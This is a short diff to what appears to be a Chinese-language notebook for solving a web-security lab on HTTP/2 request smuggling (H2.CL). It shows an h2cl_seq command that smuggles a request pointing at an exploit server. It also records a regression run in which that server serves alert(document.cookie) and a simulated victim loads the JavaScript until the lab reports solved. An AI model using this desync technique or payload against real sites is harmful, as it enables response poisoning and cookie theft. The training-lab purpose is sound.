@@ -25,3 +25,10 @@ h2cl_seq <inst>/ --data 'GET /resources HTTP/1.1\r\nHost: exploit-<id>.exploit-s
   --follow /resources/js/analytics.js?uid=keepalive --rounds 110 --interval-ms 1600 --read-ms 1200 --quiet
 banner_verdict <inst>/
 ```
+
+## R1 回归验证
+
+实例 `0a3800fc0487a913802d35ce00a600a1`,exploit `exploit-0a8d00e40416a932808934f101a800a6`(首页 `#exploit-link` 读出);
+`/resources/` 存 `alert(document.cookie)`(`Content-Type: text/javascript`)。`h2cl_seq --rounds 110 --interval-ms 1600` **后台**开跑,
+约 35s 即命中:exploit `/log` 见 13 条 `10.0.4.169  GET /resources/  (Victim) Chrome/154` ⇒ 受害者真的执行了外链 JS;实例 banner `solved:true`。
+件:range_launch / http_session / h2cl_seq(background) / banner_verdict。
